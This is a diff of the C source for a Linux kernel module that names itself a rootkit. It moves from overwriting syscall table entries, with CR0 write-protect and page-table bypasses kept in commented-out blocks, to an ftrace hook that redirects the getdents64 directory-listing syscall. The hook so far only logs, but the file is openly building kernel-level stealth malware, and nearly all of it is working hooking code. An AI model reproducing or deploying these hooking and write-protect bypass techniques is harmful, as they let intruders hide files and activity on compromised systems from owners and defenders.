@@ -136,104 +136,243 @@
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 
-/* We pack all the information we need (name, hooking function, original function)
- * into this struct. This makes is easier for setting up the hook and just passing
- * the entire struct off to fh_install_hook() later on.
- * */
 struct ftrace_hook {
     const char *name;
     void *function;
     void *original;
 
     unsigned long address;
-//    struct ftrace_ops ops;
+    struct ftrace_ops ops;
 };
 
-static unsigned long *sys_call_table = NULL;
+static int find_sys_call_addr(struct ftrace_hook *hook) {
+    hook->address = kallsyms_lookup_name(hook->name);
+    if (!hook->address) {
+        printk(KERN_ERR "Failed to find syscall table\n");
+        return 1;
+    }
+    *((unsigned long*) hook->original) = hook->address;
+    return 0;
+}
+
+static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
+{
+    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+
+    if(!within_module(parent_ip, THIS_MODULE))
+        ((struct pt_regs *)(regs))->ip = (unsigned long) hook->function;
+}
+
+static int fh_install_hook(struct ftrace_hook *hook)
+{
+    int err;
+    err = find_sys_call_addr(hook);
+    if(err)
+        return err;
+    /* For many of function hooks (especially non-trivial ones), the $rip
+     * register gets modified, so we have to alert ftrace to this fact. This
+     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
+     * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
+     * the built-in anti-recursion guard provided by ftrace is useless if
+     * we're modifying $rip. This is why we have to implement our own checks
+     * (see USE_FENTRY_OFFSET). */
+    hook->ops.func = fh_ftrace_thunk;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+            | FTRACE_OPS_FL_RECURSION
+            | FTRACE_OPS_FL_IPMODIFY;
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    if(err)
+    {
+        printk(KERN_INFO "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+        return err;
+    }
+
+    err = register_ftrace_function(&hook->ops);
+    if(err)
+    {
+        printk(KERN_INFO "rootkit: register_ftrace_function() failed: %d\n", err);
+        return err;
+    }
+
+    return 0;
+}
+
+static void fh_remove_hook(struct ftrace_hook *hook)
+{
+    int err;
+    err = unregister_ftrace_function(&hook->ops);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
+    }
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+    }
+}
+
 static asmlinkage long (*original_call)(const struct pt_regs *);
 
 static asmlinkage long myGetDents(const struct pt_regs *regs) {
 //    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->di;
+    printk(KERN_INFO "Syscall was called\n");
     long ret = original_call(regs);
     printk(KERN_INFO "Syscall was called\n");
     return ret;
 }
 
-static inline void write_cr0_force(unsigned long val) {
-    asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
-}
-
-static inline void protect_memory(void) {
-    write_cr0_force(read_cr0() | (1 << 16));
-}
-
-static inline void unprotect_memory(void) {
-    write_cr0_force(read_cr0() & (~(1 << 16)));
-}
-
-static int make_rw(unsigned long address) {
-    unsigned int level;
-    pte_t *pte = lookup_address(address, &level);
-    if (pte == NULL) 
-        return -1;
-    if (pte->pte & ~_PAGE_RW) 
-        pte->pte |= _PAGE_RW;
-    return 0;
-}
-
-static int make_ro(unsigned long address) {
-    unsigned int level;
-    pte_t *pte = lookup_address(address, &level);
-    if (pte == NULL)
-        return -1;
-    pte->pte = pte->pte & ~_PAGE_RW;
-    return 0;
-}
-
-static void hooking_syscall(void *hook_addr, uint16_t syscall_offset)
-{
-    printk(KERN_INFO "Attempting to hook syscall at offset %d\n", syscall_offset);
-    printk(KERN_INFO "Original address: %px\n", ((void *)sys_call_table[syscall_offset]));
-    
-    make_rw((unsigned long)sys_call_table);
-    sys_call_table[syscall_offset] = (unsigned long)hook_addr;
-    make_ro((unsigned long)sys_call_table);
-    
-    printk(KERN_INFO "New address: %px\n", ((void *)sys_call_table[syscall_offset]));
-}
-
-static void unhooking_syscall(void *orig_addr, uint16_t syscall_offset)
-{
-    make_rw((unsigned long)sys_call_table);
-    sys_call_table[syscall_offset] = (unsigned long)orig_addr;
-    make_ro((unsigned long)sys_call_table);
-}
-
-static unsigned long **find_sys_call_table(void) {
-    return (unsigned long **)kallsyms_lookup_name("sys_call_table");
-}
+static  struct ftrace_hook f_hook = {
+    .name = "__x64_sys_getdents64",
+    .function = (myGetDents),
+    .original = (&original_call),
+  };
 
 static int __init rootkit_init(void) {
-    printk(KERN_INFO "Bruh\n");
-    
-    sys_call_table = (unsigned long*)find_sys_call_table();
-    if (!sys_call_table) {
-        printk(KERN_ERR "Failed to find syscall table\n");
-        return -1;
-    }
-
-    original_call = (void *)sys_call_table[__NR_getdents64];
-    hooking_syscall(myGetDents, __NR_getdents64);
-    printk(KERN_INFO "addr %px\n",myGetDents);
+    if (fh_install_hook(&f_hook)) {
+      printk(KERN_INFO "Bruh minstall hook eroor\n");
+   }
     printk(KERN_INFO "Rootkit has been loaded\n");
     return 0;
 }
 
 static void __exit rootkit_exit(void) {
-    unhooking_syscall(original_call, __NR_getdents64);
+    fh_remove_hook(&f_hook);
     printk(KERN_INFO "Rootkit has been unloaded\n");
 }
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
 MODULE_LICENSE("GPL");
+
+//static inline void write_cr0_force(unsigned long val) {
+//    asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
+//}
+//
+//static inline void protect_memory(void) {
+//    write_cr0_force(read_cr0() | (1 << 16));
+//}
+//
+//static inline void unprotect_memory(void) {
+//    write_cr0_force(read_cr0() & (~(1 << 16)));
+//}
+
+//static int make_rw(unsigned long address) {
+//    unsigned int level;
+//    pte_t *pte = lookup_address(address, &level);
+//    if (pte == NULL) 
+//        return -1;
+//    if (pte->pte & ~_PAGE_RW) 
+//        pte->pte |= _PAGE_RW;
+//    return 0;
+//}
+//
+//static int make_ro(unsigned long address) {
+//    unsigned int level;
+//    pte_t *pte = lookup_address(address, &level);
+//    if (pte == NULL)
+//        return -1;
+//    pte->pte = pte->pte & ~_PAGE_RW;
+//    return 0;
+//}
+
+//static void hooking_syscall(void *hook_addr, uint16_t syscall_offset)
+//{
+//    printk(KERN_INFO "Attempting to hook syscall at offset %d\n", syscall_offset);
+//    printk(KERN_INFO "Original address: %px\n", ((void *)sys_call_table[syscall_offset]));
+//    
+//    make_rw((unsigned long)sys_call_table);
+//    sys_call_table[syscall_offset] = (unsigned long)hook_addr;
+//    make_ro((unsigned long)sys_call_table);
+//    
+//    printk(KERN_INFO "New address: %px\n", ((void *)sys_call_table[syscall_offset]));
+//}
+
+//static void unhooking_syscall(void *orig_addr, uint16_t syscall_offset)
+//{
+//    make_rw((unsigned long)sys_call_table);
+//    sys_call_table[syscall_offset] = (unsigned long)orig_addr;
+//    make_ro((unsigned long)sys_call_table);
+//}
+// For modern kernels we need this to find kernel symbols
+//
+//// CR0 write protection bypass
+//static unsigned long original_cr0;
+//
+//static inline void write_cr0_forced(unsigned long val)
+//{
+//    unsigned long __force_order;
+//
+//    asm volatile(
+//        "mov %0, %%cr0"
+//        : "+r"(val), "+m"(__force_order));
+//}
+//
+//static void disable_write_protect(void)
+//{
+//    original_cr0 = read_cr0();
+//    write_cr0_forced(original_cr0 & ~0x00010000);
+//}
+//
+//static void enable_write_protect(void)
+//{
+//    write_cr0_forced(original_cr0);
+//}
+//
+//// Your original syscall function pointer
+//static asmlinkage long (*original_syscall)(const struct pt_regs *);
+//
+//// Your hook function
+//static asmlinkage long hook_syscall(const struct pt_regs *regs)
+//{
+//    // Your hook implementation here
+//    return original_syscall(regs);
+//}
+//
+//static int __init rootkit_init(void)
+//{
+//    // Find syscall table address using kallsyms
+//    sys_call_table = (unsigned long**)lookup_name("sys_call_table");
+//    
+//    if (!sys_call_table) {
+//        printk(KERN_INFO "Failed to find syscall table\n");
+//        return -1;
+//    }
+//
+//    printk(KERN_INFO "Found syscall table at %px\n", sys_call_table);
+//
+//    // Save original syscall
+//    original_syscall = (void*)sys_call_table[__NR_mkdir]; // Replace with actual syscall number
+//
+//    // Disable write protection
+//    disable_write_protect();
+//    
+//    // Replace with our hook
+//    sys_call_table[__NR_mkdir] = (unsigned long*)hook_syscall;
+//    
+//    // Re-enable write protection
+//    enable_write_protect();
+//
+//    return 0;
+//}
+//
+//static void __exit rootkit_exit(void)
+//{
+//    if (sys_call_table) {
+//        // Disable write protection
+//        disable_write_protect();
+//        
+//        // Restore original syscall
+//        sys_call_table[__NR_mkdir] = (unsigned long*)original_syscall;
+//        
+//        // Re-enable write protection
+//        enable_write_protect();
+//    }
+//    
+//    printk(KERN_INFO "Module unloaded\n");
+//}
+//
+//module_init(rootkit_init);
+//module_exit(rootkit_exit);
